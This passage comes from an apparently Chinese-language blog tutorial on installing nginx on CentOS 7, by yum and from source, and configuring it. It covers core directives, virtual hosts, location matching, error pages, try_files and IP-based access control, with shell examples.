src="/images/1531021483355.png" alt="1531021483355"></p><h1 id="nginx的安装"><a href="#nginx的安装" class="headerlink" title="nginx的安装"></a>nginx的安装</h1><h2 id="yum源安装"><a href="#yum源安装" class="headerlink" title="yum源安装"></a>yum源安装</h2><p>官方源：<code>http://nginx.org/packages/centos/7/x86_64/</code></p><p>epel源：<code>https://mirrors.aliyun.com/epel/7/x86_64/</code></p><p>安装：<code>yum install nginx -y</code></p><p>默认主站点目录：<code>/usr/share/nginx/html</code></p><p>主程序：<code>/usr/sbin/nginx</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># nginx 启动服务</span><br><span class="line"># nginx -v|-V 查看版本</span><br><span class="line"># nginx -t 检查配置文件</span><br><span class="line"># nginx -c filename 指定配置文件(default: /etc/nginx/nginx.conf)</span><br><span class="line"># nginx -s signal 发送信号给master进程，signal：stop, quit, reopen, reload</span><br><span class="line"># nginx -g directives 在命令行中指明全局指令</span><br></pre></td></tr></table></figure><p>主配文件：<code>/etc/nginx/nginx.conf</code></p><p>子配文件：<code>/etc/nginx/conf.d/*</code></p><p>配置文件格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">main block：主配置段，即全局配置段，对http,mail都有效</span><br><span class="line">event &#123; </span><br><span class="line">... </span><br><span class="line">&#125;   事件驱动相关的配置</span><br><span class="line"></span><br><span class="line">http &#123; </span><br><span class="line">... </span><br><span class="line">&#125;   http/https 协议相关配置段</span><br><span class="line"></span><br><span class="line">mail &#123; </span><br><span class="line">... </span><br><span class="line">&#125;   mail 协议相关配置段</span><br><span class="line"></span><br><span class="line">stream &#123;</span><br><span class="line">... </span><br><span class="line">&#125;   stream 服务器相关配置段</span><br></pre></td></tr></table></figure><p>默认配置文件示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                      &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                      &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line">    access_log  /var/log/nginx/access.log  main;</span><br><span class="line">    sendfile            on;</span><br><span class="line">    tcp_nopush          on;</span><br><span class="line">    tcp_nodelay         on;</span><br><span class="line">    keepalive_timeout   65;</span><br><span class="line">    types_hash_max_size 2048;</span><br><span class="line">    include             /etc/nginx/mime.types;</span><br><span class="line">    default_type        application/octet-stream;</span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80 default_server;</span><br><span class="line">        listen       [::]:80 default_server;</span><br><span class="line">        server_name  _;</span><br><span class="line">        root         /usr/share/nginx/html;</span><br><span class="line">        include /etc/nginx/default.d/*.conf;</span><br><span class="line">        location / &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        error_page 404 /404.html;</span><br><span class="line">            location = /40x.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        error_page 500 502 503 504 /50x.html;</span><br><span class="line">            location = /50x.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[root@centos7 ~]# yum install pcre-devel openssl-devel zlib-devel -y</span><br><span class="line">[root@centos7 ~]# useradd -r -s /sbin/nologin nginx</span><br><span class="line">[root@centos7 ~]# wget https://nginx.org/download/nginx-1.14.0.tar.gz</span><br><span class="line">[root@centos7 ~]# tar xf nginx-1.14.0.tar.gz</span><br><span class="line">[root@centos7 ~]# cd nginx-1.14.0/</span><br><span class="line">[root@centos7 nginx-1.14.0]# vim src/http/ngx_http_header_filter_module.c</span><br><span class="line">static u_char ngx_http_server_string[] = &quot;Server: feijikesi&quot; CRLF;</span><br><span class="line">[root@centos7 nginx-1.14.0]# vim src/core/nginx.h</span><br><span class="line">#define NGINX_VERSION      &quot;6.6.6&quot;   #Server_tokens 显示的版本号</span><br><span class="line">#define NGINX_VER          &quot;honginx/&quot; NGINX_VERSION#Server_tokens 显示的服务名称</span><br><span class="line">[root@centos7 nginx-1.14.0]# ./configure --prefix=/usr/local/nginx \</span><br><span class="line">&gt; --conf-path=/etc/nginx/nginx.conf \</span><br><span class="line">&gt; --error-log-path=/var/log/nginx/error.log \</span><br><span class="line">&gt; --http-log-path=/var/log/nginx/access.log \</span><br><span class="line">&gt; --pid-path=/var/run/nginx.pid \</span><br><span class="line">&gt; --lock-path=/var/run/nginx.lock \</span><br><span class="line">&gt; --user=nginx \</span><br><span class="line">&gt; --group=nginx \</span><br><span class="line">&gt; --with-http_ssl_module \</span><br><span class="line">&gt; --with-http_v2_module \</span><br><span class="line">&gt; --with-http_dav_module \</span><br><span class="line">&gt; --with-http_stub_status_module \</span><br><span class="line">&gt; --with-threads \</span><br><span class="line">&gt; --with-file-aio</span><br><span class="line"></span><br><span class="line">[root@centos7 nginx-1.14.0]# make &amp;&amp; make install</span><br><span class="line">[root@centos7 ~]# echo &apos;PATH=/usr/local/nginx/sbin/:$PATH&apos; &gt; /etc/profile.d/nginx.sh</span><br><span class="line">[root@centos7 ~]# . /etc/profile.d/nginx.sh</span><br><span class="line">[root@centos7 ~]# nginx</span><br><span class="line">[root@centos7 ~]# curl -I 127.0.0.1</span><br><span class="line">Server: honginx/6.6.6</span><br><span class="line">[root@centos7 ~]# vim /etc/nginx/nginx.conf</span><br><span class="line">http &#123;</span><br><span class="line">    server_tokens off;</span><br><span class="line">&#125;</span><br><span class="line">[root@centos7 ~]# nginx -s reload</span><br><span class="line">[root@centos7 ~]# curl -I 127.0.0.1</span><br><span class="line">Server: honginx</span><br></pre></td></tr></table></figure><h3 id="nginx编译安装选项说明"><a href="#nginx编译安装选项说明" class="headerlink" title="nginx编译安装选项说明"></a>nginx编译安装选项说明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">--prefix=/etc/nginx 安装路径</span><br><span class="line">--sbin-path=/usr/sbin/nginx 指明nginx程序文件安装路径</span><br><span class="line">--conf-path=/etc/nginx/nginx.conf 主配置文件安装位置</span><br><span class="line">--error-log-path=/var/log/nginx/error.log 错误日志文件安装位置</span><br><span class="line">--http-log-path=/var/log/nginx/access.log 访问日志文件安装位置</span><br><span class="line">--pid-path=/var/run/nginx.pid 指明pid文件安装位置</span><br><span class="line">--lock-path=/var/run/nginx.lock 锁文件安装位置</span><br><span class="line">--http-client-body-temp-path=/var/cache/nginx/client_temp \</span><br><span class="line">#客户端body部分的临时文件存放路径，服务器允许客户端使用put方法提交大数据时，临时存放的磁盘路径</span><br><span class="line">--http-proxy-temp-path=/var/cache/nginx/proxy_temp \</span><br><span class="line">#作为代理服务器，服务器响应报文的临时文件存放路径</span><br><span class="line">--http-fastcgi-temp-path=/var/cache/nginx/fastcgi_temp \</span><br><span class="line">#作为fastcgi代理服务器，服务器响应报文的临时文件存放路径</span><br><span class="line">--http-uwsgi-temp-path=/var/cache/nginx/uwsgi_temp \</span><br><span class="line">#作为uwsgi代理服务器，服务器响应报文的临时文件存放路径</span><br><span class="line">--http-scgi-temp-path=/var/cache/nginx/scgi_temp \</span><br><span class="line">#作为scgi反代服务器，服务器响应报文的临时文件存放路径</span><br><span class="line">--user=nginx 指明以那个身份运行worker进程，主控master进程一般由root运行</span><br><span class="line">--group=nginx</span><br><span class="line">--with-http_ssl_module 表示把指定模块编译进来</span><br></pre></td></tr></table></figure><h1 id="nginx主配置段"><a href="#nginx主配置段" class="headerlink" title="nginx主配置段"></a>nginx主配置段</h1><p>帮助文档：<code>http://nginx.org/en/docs/ngx_core_module.html</code></p><h2 id="正常运行必备的配置"><a href="#正常运行必备的配置" class="headerlink" title="正常运行必备的配置"></a>正常运行必备的配置</h2><ul><li><p>user：指定worker进程的运行身份，如组不指定，默认和用户名同名</p></li><li><p>pid /PATH/TO/PID_FILE：指定存储nginx主进程PID的文件路径</p></li><li><p>include file|mask：指明包含进来的其它配置文件片断</p></li><li><p>load_module file：</p><p>模块加载配置文件：/usr/share/nginx/modules/*.conf</p><p>指明要装载的动态模块路径：/usr/lib64/nginx/modules/*.so</p></li></ul><h2 id="优化性能相关的配置"><a href="#优化性能相关的配置" class="headerlink" title="优化性能相关的配置"></a>优化性能相关的配置</h2><ul><li><p>worker_processes number | auto：worker进程的数量；通常应该为当前主机的cpu的物理核心数</p></li><li><p>worker_cpu_affinity cpumask …：将worker进程绑定到指定CPU上，提高缓存命中率</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cpumask:</span><br><span class="line">00000001：0号CPU</span><br><span class="line">00000010：1号CPU</span><br><span class="line">10000000：8号CPU</span><br><span class="line">worker_cpu_affinity 0001 0010 0100 1000; 分别将worker进程绑定到1,2,3,4号CPU上</span><br></pre></td></tr></table></figure><ul><li><p>worker_priority number：指定worker进程的nice值，设定worker进程优先级：[-20-19]</p></li><li><p>worker_rlimit_nofile number：worker进程所能够打开的文件数量上限</p></li></ul><h2 id="用于调试及定位问题相关的配置"><a href="#用于调试及定位问题相关的配置" class="headerlink" title="用于调试及定位问题相关的配置"></a>用于调试及定位问题相关的配置</h2><ul><li>daemon on|off：是否以守护进程方式运行nignx，默认是守护进程方式</li><li>master_process on|off：是否以master/worker模型运行nginx；默认为on；off 将不启动worker</li><li>error_log file [level] ：错误日志文件及其级别；出于调试需要，可设定为debug；但debug仅在编译时使用了“–with-debug”选项时才有效：level:debug|info|notice|warn|error|crit|alter|emerg</li></ul><h2 id="事件驱动相关的配置"><a href="#事件驱动相关的配置" class="headerlink" title="事件驱动相关的配置"></a>事件驱动相关的配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>worker_connections number：每个worker进程所能够打开的最大并发连接数数量；总最大并发数：worker_processes * worker_connections</li><li>use method：指明并发连接请求的处理方法，默认自动选择最优方法：use epoll;</li><li>accept_mutex on|off：处理新的连接请求的方法；on指由各个worker轮流处理新请求，Off指每个新请求的到达都会通知(唤醒)所有的worker进程，但只有一个进程可获得连接，会造成“惊群”，影响服务器性能，建议开启</li></ul><h1 id="nginx的模块"><a href="#nginx的模块" class="headerlink" title="nginx的模块"></a>nginx的模块</h1><p>nginx高度模块化，但其模块早期不支持DSO机制；1.9.11版本支持动态装载和卸载</p><blockquote><p>核心模块：core module</p><p>标准模块：</p><ul><li>HTTP 模块：ngx_http_*</li><li>Mail 模块    ngx_mail_*</li><li>Stream 模块 ngx_stream_*</li></ul><p>第三方模块：</p></blockquote><h2 id="ngx-http-core-module-核心模块"><a href="#ngx-http-core-module-核心模块" class="headerlink" title="ngx_http_core_module 核心模块"></a>ngx_http_core_module 核心模块</h2><p>1）<strong>server</strong> { … }：配置虚拟主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">]# vim /etc/nginx/nginx.conf</span><br><span class="line">http  &#123; </span><br><span class="line">   server &#123;</span><br><span class="line">       listen 80;</span><br><span class="line">       server_name www.fenghong.tech;</span><br><span class="line">       root /data/www/;</span><br><span class="line">   &#125;</span><br><span class="line">   server &#123;</span><br><span class="line">       listen 80;</span><br><span class="line">       server_name news.fenghong.tech;</span><br><span class="line">       root /data/news/;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">]# nginx  启动服务</span><br><span class="line">]# echo news site &gt; /data/news/index.html</span><br><span class="line">]# echo www site &gt; /data/www/index.html</span><br></pre></td></tr></table></figure><p>客户端测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">]# curl www.fenghong.tech</span><br><span class="line">www site</span><br><span class="line">]# curl news.fenghong.tech</span><br><span class="line">news site</span><br></pre></td></tr></table></figure><p>2）<strong>listen</strong> port|address[:port]|unix:/PATH/TO/SOCKET_FILE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen address[:port] [default_server] [ssl] [http2 | spdy]  [backlog=number] [rcvbuf=size] [sndbuf=size]</span><br></pre></td></tr></table></figure><ul><li>default_server：设定为默认虚拟主机</li><li>ssl：限制仅能够通过ssl连接提供服务</li><li>backlog=number：超过并发连接数后，新请求进入后援队列的长</li><li>rcvbuf=size：接收缓冲区大小</li><li>sndbuf=size：发送缓冲区大小</li></ul><blockquote><p>listen PORT;     指令监听在不同的端口，可实现基于端口的虚拟主机</p><p>listen IP:PORT;   监听 IP 地址不同，实现基于IP的虚拟主机</p></blockquote><p>3）<strong>server_name</strong> name …</p><p>虚拟主机的主机名称后可跟多个由空白字符分隔的字符串</p><p>支持*通配任意长度的任意字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name *.fenghong.tech;</span><br><span class="line">        root /data/default/;</span><br><span class="line">    &#125;</span><br><span class="line">]# echo default &gt; /data/default/index.html</span><br><span class="line">]# nginx -s reload</span><br><span class="line">]# curl xxx.fenghong.tech</span><br><span class="line">default</span><br></pre></td></tr></table></figure><p>支持  ~  起始的字符做正则表达式模式匹配，性能原因慎用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server_name~^www\d+\.fenghong\.tech$  #说明：\d 表示 [0-9]</span><br></pre></td></tr></table></figure><blockquote><p>匹配优先级机制从高到低：<br>(1) 首先是字符串精确匹配 如：<a href="http://www.fenghong.com" target="_blank" rel="noopener">www.fenghong.com</a><br>(2) 左侧*通配符  如：*.fenghong.tech<br>(3) 右侧*通配符  如：<a href="http://www.fenghong.\" target="_blank" rel="noopener">www.fenghong.\</a><em><br>(4) 正则表达式  如： ~^.</em>\.fenghong\.tech$<br>(5) default_server</p></blockquote><p>4）<strong>tcp_nodelay</strong> on|off</p><p>在keepalived模式下的连接是否启用TCP_NODELAY选项</p><p>当为off时，延迟发送，合并多个请求后再发送</p><p>默认on时，不延迟发送</p><p>可用于：http, server, location</p><blockquote><p>如果为了节约服务器性能可以打开，如果为了用户体验更好选择关闭</p></blockquote><p>5）<strong>sendfile</strong> on|off</p><p>是否启用sendfile功能，在内核中封装报文直接发送，默认关闭</p><p>6）<strong>server_tokens</strong> on|off|build|string</p><p>是否在响应报文的Server首部显示nginx版本，建议关闭</p><p>7）<strong>root</strong></p><p>设置web资源的路径映射；用于指明请求的URL所对应的文档的目录路径，可用于http, server, location, if in location</p><p>8）<strong>location</strong> [ = | ~ | ~* | ^~ ] uri { … } </p><p>在一个server中location配置段可存在多个，用于实现从uri到文件系统的路径映射；ngnix会根据用户请求的URI来检查定义的所有location，并找出一个最佳匹配，而后应用其配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># mkdir /data/www/blog/</span><br><span class="line"># echo blog &gt; /data/www/blog/index.html</span><br><span class="line"># vim /etc/nginx/nginx.conf</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name www.fenghong.tech;</span><br><span class="line">        root /data/www/;</span><br><span class="line">        location /blog &#123;</span><br><span class="line">            root /data/www/;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"># curl http://www.fenghong.tech/blog/  #测试</span><br><span class="line">blog</span><br></pre></td></tr></table></figure><blockquote><p>=：对URI做精确匹配</p><p>^~： 对URI的最左边部分做匹配检查，不区分字符大小写</p><p>~：   对URI做正则表达式模式匹配，区分字符大小写</p><p>~*： 对URI做正则表达式模式匹配，不区分字符大小写</p><p>不带符号：匹配起始于此uri的所有的uri</p></blockquote><p>匹配优先级从高到低：=, ^~, ～/～*, 不带符号</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">location = / &#123;</span><br><span class="line">    [ configuration A ]</span><br><span class="line">&#125;</span><br><span class="line">location / &#123;</span><br><span class="line">    [ configuration B ]</span><br><span class="line">&#125;</span><br><span class="line">location /documents/ &#123;</span><br><span class="line">    [ configuration C ]</span><br><span class="line">&#125;</span><br><span class="line">location ^~ /images/ &#123;</span><br><span class="line">    [ configuration D ]</span><br><span class="line">&#125;</span><br><span class="line">location ~* \.(gif|jpg|jpeg)$ &#123;</span><br><span class="line">    [ configuration E ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">The “/” request will match configuration A, </span><br><span class="line">the “/index.html” request will match configuration B, </span><br><span class="line">the “/documents/document.html” request will match configuration C, </span><br><span class="line">the “/images/1.gif” request will match configuration D, </span><br><span class="line">and the “/documents/1.jpg” request will match configuration E.</span><br></pre></td></tr></table></figure><p>9）<strong>alias</strong></p><p>路径别名，文档映射的另一种机制；仅能用于location上下文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name www.fenghong.tech;</span><br><span class="line">        root /data/www/;</span><br><span class="line">        location /blog &#123;</span><br><span class="line">            alias /data/www/blog;  #和root /data/www/;作用相同</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"># curl http://www.fenghong.tech/blog/</span><br><span class="line">blog</span><br></pre></td></tr></table></figure><blockquote><p>注意：location中使用root指令和alias指令的意义不同<br>(a) root，给定的路径对应于location中的/uri/左侧的/<br>(b) alias，给定的路径对应于location中的/uri/右侧的/</p></blockquote><p>10）<strong>index</strong> file …</p><p>指定默认网页文件，注意需要装载 ngx_http_index_module 模块</p><p>11）<strong>error_page</strong> code … [=[response]] uri</p><p>定义错误页，以指定的响应状态码进行响应；可用位置：http, server, location, if in location</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># echo &quot;404 not found page&quot; &gt; /data/www/404.html</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name www.fenghong.tech;</span><br><span class="line">        root /data/www/;</span><br><span class="line">        error_page 404 /404.html;</span><br><span class="line">    &#125;</span><br><span class="line"># curl http://www.fenghong.tech/notfound.html</span><br><span class="line">404 not found page</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name www.fenghong.tech;</span><br><span class="line">        root /data/www/;</span><br><span class="line">        error_page 404 =200 /404.html;  #将404返回码重定向成200访问码，防止浏览器劫持</span><br><span class="line">    &#125;</span><br><span class="line"># curl -I http://www.fenghong.tech/notfound.html</span><br><span class="line">HTTP/1.1 200 OK  #测试为200正确访问码</span><br></pre></td></tr></table></figure><p>12）<strong>try_files</strong> file … uri | =code</p><p>​    按顺序检查文件是否存在，返回第一个找到的文件或文件夹（结尾加斜线表示为文件夹），如果所有的文件或文件夹都找不到，会进行一个内部重定向到最后一个参数。只有最后一个参数可以引起一个内部重定向，之前的参数只设置内部URI的指向。最后一个参数是回退URI且必须存在，否则会出现内部500错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># echo default page &gt; /data/news/default.html</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name news.fenghong.tech;</span><br><span class="line">        root /data/news/;</span><br><span class="line">        location / &#123;</span><br><span class="line">            try_files $uri /default.html;  #如果用户访问的URI不存在则放回默认页面</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"># curl http://news.fenghong.tech/index.html   </span><br><span class="line">news site</span><br><span class="line"># curl http://news.fenghong.tech/noindex.html</span><br><span class="line">default page</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name news.fenghong.tech;</span><br><span class="line">        root /data/news/;</span><br><span class="line">        location / &#123;</span><br><span class="line">            try_files $uri $uri/index.html $uri.html =404;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"># curl http://news.fenghong.tech/index.html  </span><br><span class="line">news site</span><br><span class="line"># curl http://news.fenghong.tech/noindex.html</span><br><span class="line">404 Not Found</span><br></pre></td></tr></table></figure><p>13）<strong>keepalive_timeout</strong> timeout [header_timeout]</p><p>设定保持连接超时时长，0表示禁止长连接，默认为75s，可用于http, server, location</p><p>14）<strong>keepalive_requests</strong> number</p><p>在一次长连接上所允许请求的资源的最大数量，默认为100</p><p>15）<strong>keepalive_disable</strong> none | browser …</p><p>对哪类型的浏览器禁用长连接</p><p>16）<strong>send_timeout</strong> time</p><p>向客户端发送响应报文的超时时长，此处是指两次写操作之间的间隔时长，而非整个响应过程的传输时长</p><p>17）<strong>client_body_buffer_size</strong> size</p><p>用于接收每个客户端请求报文的body部分的缓冲区大小；默认为16k；</p><p>超出此大小时，其将被暂存到磁盘上的由下面 client_body_temp_path 指令所定义的位置</p><p>18）<strong>client_body_temp_path</strong> path [level1 [level2 [level3]]]</p><p>设定存储客户端请求报文的body部分的临时存储路径及子目录结构和数量</p><p>19）<strong>limit_rate</strong> rate</p><p>限制响应给客户端的传输速率，单位是bytes/second；默认值0表示无限制</p><p>20）<strong>limit_except</strong> method … { … }</p><p>限制客户端使用除了指定的请求方法之外的其它方法，仅用于location</p><blockquote><p>method:GET(包括HEAD), HEAD, POST, PUT, DELETE, MKCOL, COPY, MOVE, OPTIONS, PROPFIND, PROPPATCH, LOCK, UNLOCK, PATCH</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location /upload &#123;</span><br><span class="line">    root /date/www/;</span><br><span class="line">    limit_except GAT &#123;</span><br><span class="line">        allow 192.168.0.9/24;</span><br><span class="line">        deny all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 除了 GET和HEAD 之外其它方法仅允许192.168.0.9/24主机使用</span><br></pre></td></tr></table></figure><p>21）<strong>aio</strong> on | off | threads[=pool]</p><p>是否启用aio功能</p><p>22）<strong>directio</strong> size | off</p><p>当文件大于等于给定大小时，例如directio 4m，同步到磁盘，而非写缓存，以防数据丢失</p><p>23）<strong>open_file_cache</strong> off  | max=N [inactive=time]</p><ul><li>max=N：可缓存的缓存项上限；达到上限后会使用LRU算法实现管理</li><li>inactive=time：缓存项的非活动时长，在此处指定的时长内未被命中的或命中的次数少于open_file_cache_min_uses指令所指定的次数的缓存项即为非活动项将被删除</li></ul><p>24）<strong>open_file_cache_errors</strong> on | off</p><p>是否缓存查找时发生错误的文件一类的信息，默认值为off</p><p>25）<strong>open_file_cache_min_uses</strong> number</p><p>open_file_cache指令的inactive参数指定的时长内，至少被命中此处指定的次数方可被归类为活动项，默认值为1</p><p>26）<strong>open_file_cache_valid</strong> time</p><p>缓存项有效性的检查频率，默认值为60s </p><h2 id="ngx-http-access-module-访问控制模块"><a href="#ngx-http-access-module-访问控制模块" class="headerlink" title="ngx_http_access_module 访问控制模块"></a>ngx_http_access_module 访问控制模块</h2><p>基于ip的访问控制功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    server_name www.fenghong.tech;</span><br><span class="line">    root /data/www/;</span><br><span class="line">    location / &#123;</span><br><span class="line">        allow 192.168.0.0/24;</span><br><span class="line">        deny all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>自上而下检查，一旦匹配，将生效，条件严格的置前</p></blockquote><h2 id="ngx-http-auth-basic-module-用户认证模块"><a href="#ngx-http-auth-basic-module-用户认证模块" class="headerlink" title="ngx_http_auth_basic_module 用户认证模块"></a>ngx_http_auth_basic_module 